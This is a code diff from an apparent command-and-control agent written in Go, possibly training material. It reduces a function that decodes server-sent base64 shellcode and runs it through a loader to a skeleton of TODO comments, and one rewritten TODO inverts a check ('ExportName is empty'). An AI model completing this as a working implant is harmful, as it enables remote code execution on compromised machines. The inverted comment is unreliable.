@@ -16,33 +16,18 @@ func (agent *HTTPSAgent) orchestrateShellcode(job *server.HTTPSResponse) AgentTa
 
 	// Create an instance of the shellcode args struct
 	// TODO: create shellcodeArgs of type control.ShellcodeArgsAgent
-	var shellcodeArgs control.ShellcodeArgsAgent
 
 	// ServerResponse.Arguments contains the command-specific args, so now we unmarshal the field into the struct
 	// TODO: Unmarshal job.Arguments into shellcodeArgs
-	if err != nil {
-		errMsg := fmt.Sprintf("Failed to unmarshal ShellcodeArgs for Task ID %s: %v. ", job.JobID, err)
-		log.Printf("|ERR SHELLCODE ORCHESTRATOR| %s", errMsg)
-		return AgentTaskResult{
-			JobID:   job.JobID,
-			Success: false,
-			Error:   "failed to unmarshal ShellcodeArgs",
-		}
-	}
+	// TODO: Error-check, return AgentTaskResult if failed
+
 	log.Printf("|SHELLCODE ORCHESTRATOR| Task ID: %s. Executing Shellcode, Export Function: %s, ShellcodeLen(b64)=%d\n",
 		job.JobID, shellcodeArgs.ExportName, len(shellcodeArgs.ShellcodeBase64))
 
 	// Some basic agent-side validation
-	if shellcodeArgs.ShellcodeBase64 == "" {
-		log.Printf("|ERR SHELLCODE ORCHESTRATOR| Task ID %s: ShellcodeBase64 is empty.", job.JobID)
-		return AgentTaskResult{
-			JobID:   job.JobID,
-			Success: false,
-			Error:   "ShellcodeBase64 cannot be empty",
-		}
-	}
+	// TODO: check if shellcodeArgs.ShellcodeBase64 is empty
 
-	// TODO: Validate that shellcodeArgs.ExportName is not empty
+	// TODO: Validate that shellcodeArgs.ExportName is empty
 
 	// Now let's decode our b64
 	// TODO: call base64.StdEncoding.DecodeString to decode shellcodeArgs.ShellcodeBase64 as rawShellcode
@@ -58,28 +43,29 @@ func (agent *HTTPSAgent) orchestrateShellcode(job *server.HTTPSResponse) AgentTa
 
 	// Call the "doer" function
 	// TODO: call constructor via interface - shellcode.New() - assign return as commandShellcode
-	shellcodeResult, err := commandShellcode.DoShellcode(rawShellcode, shellcodeArgs.ExportName)
+
+	// TODO: call DoShellCode() on commandShellcode
 
 	finalResult := AgentTaskResult{
 		JobID: job.JobID,
 	}
 
-	outputJSON, _ := json.Marshal(string(shellcodeResult.Message))
+	// TODO: Marshall shellcodeResult.Message, save as outputJSON
 
 	// TODO: set finalResult.CommandResult as outputJSON
 
 	if err != nil {
 		loaderError := fmt.Sprintf("|ERR SHELLCODE ORCHESTRATOR| Loader execution error for TaskID %s: %v. Loader Message: %s",
 			job.JobID, err, shellcodeResult.Message)
-		log.Printf(loaderError)
-		finalResult.Error = loaderError
-		finalResult.Success = false
+		// TODO: print loaderError to terminal
+		// TODO: set finalResult.Error equal to loaderError
+		// TODO: finalResult.Success equal to false
 
 	} else {
 		log.Printf("|SHELLCODE SUCCESS| Shellcode execution initiated successfully for TaskID %s. Loader Message: %s",
 			job.JobID, shellcodeResult.Message)
-		finalResult.Success = true
+		// TODO: finalResult.Success equal to true
 	}
 
-	return finalResult
+	// TODO: return finalResult
 }
